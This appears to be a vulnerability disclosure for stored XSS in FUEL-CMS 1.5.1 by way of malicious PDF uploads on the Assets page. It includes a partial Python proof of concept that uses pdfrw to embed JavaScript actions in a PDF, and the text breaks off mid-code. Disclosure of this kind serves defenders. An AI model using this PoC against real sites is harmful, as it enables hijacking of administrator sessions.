| A stored cross-site scripting (XSS) vulnerability exists in FUEL-CMS-1.5.1 that allows an authenticated user authorized to upload a malicious .pdf file which acts as a stored XSS payload. If this stored XSS payload is triggered by an administrator it will trigger a XSS attack. 1、login as admin .in the Assets page [image](https://user-images.githubusercontent.com/42400388/161377109-206997ec-f92a-4ac9-ae0e-9f7645068630.png) 2、Use the following PoC to generate malicious files :  ``` # FROM https://github.com/osnr/horrifying-pdf-experiments import sys  from pdfrw import PdfWriter from pdfrw.objects.pdfname import PdfName from pdfrw.objects.pdfstring import PdfString from pdfrw.objects.pdfdict import PdfDict from pdfrw.objects.pdfarray import PdfArray  def make_js_action(js):     action = PdfDict()     action.S = PdfName.JavaScript     action.JS = js     return action   def make_field(name, x, y, width, height, r, g, b, value=""):     annot = PdfDict()     annot.Type = PdfName.Annot     annot.Subtype = PdfName.Widget     annot.FT = PdfName.Tx     annot.Ff = 2     annot.Rect = PdfArray([x, y, x + width, y + height])     annot.MaxLen = 160     annot.T = PdfString.encode(name)     annot.V = PdfString.encode(value)       # Default appearance stream: can be arbitrary PDF XObject or     # something.
